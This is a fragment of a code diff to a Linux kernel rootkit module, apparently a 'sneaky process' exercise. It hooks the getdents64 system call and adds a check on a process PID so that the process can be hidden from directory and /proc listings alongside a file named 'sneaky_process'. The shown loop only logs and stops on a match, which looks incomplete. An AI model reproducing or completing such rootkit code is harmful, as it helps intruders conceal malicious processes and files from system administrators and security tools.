@@ -64,14 +64,17 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
-{  
+{
+  char pid_txt[20];
+  sprintf(pid_txt, "%d", pid);
+  
   int original_result =  (*original_getdents64)(regs);
   int sneaky_result = original_result;
   int curr_pos = 0;
   struct linux_dirent64 * curr_dirp = regs->si;
 
   while(curr_pos < original_result) {
-    if(strcmp(curr_dirp->d_name, "sneaky_process") == 0){
+    if((strcmp(curr_dirp->d_name, "sneaky_process") == 0) || (strcmp(curr_dirp->d_name, pid_txt) == 0)){
       printk(KERN_INFO "File name %s \n", curr_dirp->d_name);
       break;
     }
